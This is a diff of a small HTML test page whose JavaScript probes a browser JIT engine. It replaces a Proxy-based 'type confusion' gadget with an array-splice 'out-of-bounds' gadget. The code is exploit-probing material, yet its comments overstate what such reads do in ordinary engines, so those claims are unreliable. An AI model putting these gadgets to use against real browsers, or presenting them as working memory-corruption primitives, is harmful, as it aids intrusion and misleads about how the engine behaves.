@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Gadget Test - Type Confusion</title>
+  <title>Gadget - OOB Write</title>
   <style>
     body {
       background: black;
@@ -16,8 +16,8 @@
   </style>
 </head>
 <body>
-  <h1>Iniciando gadgets...</h1>
-  <div id="log">Pronto...</div>
+  <h1>Gadget OOB Test</h1>
+  <div id="log">Aguardando execução...</div>
 
   <script>
     const logElement = document.getElementById("log");
@@ -28,34 +28,26 @@
       logElement.textContent = logData;
     }
 
-    function aggressiveGadget3() {
-      let arr = [1.1, 2.2, 3.3, 4.4];
-      let evil = {
-        get: function(target, prop, receiver) {
-          if (prop === "length") {
-            arr.length = 1;
-          }
-          return Reflect.get(target, prop, receiver);
-        }
-      };
-
-      let proxy = new Proxy(arr, evil);
-
-      function confuse(o) {
-        return o[2]; // espera double, pode causar type confusion
+    function oobGadget() {
+      function confuse(arr, i) {
+        return arr[i];
       }
 
-      for (let i = 0; i < 100000; i++) confuse(arr); // força JIT
+      let victim = [1.1, 2.2, 3.3, 4.4];
+      for (let i = 0; i < 100000; i++) confuse(victim, 0); // aquece o JIT
 
-      let res = confuse(proxy);
-      log("[gadget3] Anomalia detectada: " + res);
+      // Mutação perigosa
+      victim.splice(1, 2); // corta o array
+
+      let result = confuse(victim, 3); // fora do novo comprimento
+
+      log("[gadget-oob] Resultado pós-splice: " + result);
     }
 
     setTimeout(() => {
-      log("Pronto para iniciar...");
-      log("Iniciando gadgets...\\n");
-      aggressiveGadget3();
-      log("\\nFinalizado.");
+      log("Iniciando gadget de OOB...");
+      oobGadget();
+      log("Finalizado.");
     }, 1500);
   </script>
 </body>
